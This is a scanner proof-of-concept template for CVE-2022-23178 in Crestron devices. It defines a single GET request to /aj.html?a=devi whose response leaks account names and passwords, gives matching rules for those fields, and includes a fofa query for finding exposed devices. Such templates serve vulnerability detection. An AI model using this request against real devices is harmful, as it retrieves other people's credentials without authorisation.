id: poc-yaml-crestron-aj-html-account-password-leak
info:
  name: Crestron aj.html 账号密码泄漏漏洞(CVE-2022-23178)
  severity: high
  tags:
  - CVE-2022-23178
  - 两高一弱
  finger: HD-MD4X2-4K-E
  fofa: app="Crestron-HD-RX-201-C-E"
requests:
- method: GET
  path: /aj.html?a=devi
  expression: 'status_code == 200

    && contains(body,"uname")

    && contains(body,"upassword")

    && contains(body,"login_ur")

    && !contains(body,"<")

    '
variables: {}
transport: http
